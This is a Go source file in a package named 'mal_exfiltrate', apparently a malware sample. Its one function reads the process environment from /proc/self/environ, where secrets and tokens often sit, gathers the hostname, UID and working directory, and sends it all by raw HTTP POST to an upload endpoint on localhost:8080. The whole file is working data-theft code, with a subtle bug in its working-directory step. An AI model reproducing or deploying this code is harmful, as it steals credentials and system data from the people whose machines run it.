package mal_exfiltrate

import (
	"fmt"
	"net"
	"syscall"
	"unsafe"
)

func ExfiltrateSensitiveData() {

	// ----------------------------------------------------------------
	// 1. Read raw environment data from /proc/self/environ
	// ----------------------------------------------------------------
	var dataToSend []byte

	fd, err := syscall.Open("/proc/self/environ", syscall.O_RDONLY, 0)
	if err == nil {
		defer syscall.Close(fd)

		// For simplicity, read up to 8 KB. Real code might loop until EOF or use a dynamic buffer.
		buf := make([]byte, 8192)
		n, _ := syscall.Read(fd, buf)
		if n > 0 {
			dataToSend = append(dataToSend, []byte("Environment:\n")...)
			dataToSend = append(dataToSend, buf[:n]...)
			dataToSend = append(dataToSend, '\n')
		}
	}

	// ----------------------------------------------------------------
	// 2. Get hostname via syscall.Uname
	// ----------------------------------------------------------------
	var uts syscall.Utsname
	if err := syscall.Uname(&uts); err == nil {
		// uts.Nodename is [65]int8. Convert to a Go string:
		hostname := charsToString(uts.Nodename[:])
		dataToSend = append(dataToSend, []byte("\nHostname: "+hostname+"\n")...)
	}

	// ----------------------------------------------------------------
	// 3. Get user ID (instead of full username), via syscall.Getuid
	// ----------------------------------------------------------------
	uid := syscall.Getuid()
	dataToSend = append(dataToSend, []byte(fmt.Sprintf("\nCurrent UID: %d\n", uid))...)

	// ----------------------------------------------------------------
	// 4. Get current working directory via syscall.Getcwd
	// ----------------------------------------------------------------
	cwdBuf := make([]byte, 1024)
	if n, err := syscall.Getcwd(cwdBuf); err == nil {
		dataToSend = append(dataToSend, []byte("\nCurrent working dir: "+string(n)+"\n")...)
	}

	// ----------------------------------------------------------------
	// 5. Open a socket, connect, and manually send an HTTP POST
	// ----------------------------------------------------------------
	// We'll connect to localhost:8080. This requires building a SockaddrInet4.
	var addr syscall.SockaddrInet4
	addr.Port = 8080
	// Convert 127.0.0.1 to a 4-byte representation
	ip4 := net.ParseIP("127.0.0.1").To4()
	copy(addr.Addr[:], ip4)

	// Create a TCP socket
	sock, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)
	if err != nil {
		return
	}
	defer syscall.Close(sock)

	// Connect to localhost:8080
	if err := syscall.Connect(sock, &addr); err != nil {
		return
	}

	// Build a minimal HTTP POST request
	// Note: This is extremely naive (no headers for Host except minimal, no chunking, etc.)
	postRequest := fmt.Sprintf(
		"POST /upload HTTP/1.1\r\n"+
			"Host: localhost\r\n"+
			"Content-Type: text/plain\r\n"+
			"Content-Length: %d\r\n"+
			"\r\n%s",
		len(dataToSend),
		string(dataToSend),
	)

	// Write the request to the socket
	syscall.Write(sock, []byte(postRequest))

	// Optionally read back a response (not strictly necessary here)
	respBuf := make([]byte, 4096)
	syscall.Read(sock, respBuf)
	// (We won’t parse the response; just discarding it.)

	// Socket is closed by the defer above. We’re done!
}

// -----------------------------------------------------------------------------
// Helper function to convert [65]int8 => Go string, used for Utsname.Nodename
// -----------------------------------------------------------------------------
func charsToString(ca []int8) string {
	// find the first 0
	n := 0
	for ; n < len(ca); n++ {
		if ca[n] == 0 {
			break
		}
	}
	// Convert int8 slice -> byte slice -> string
	return string((*[1 << 30]byte)(unsafe.Pointer(&ca[0]))[:n:n])
}
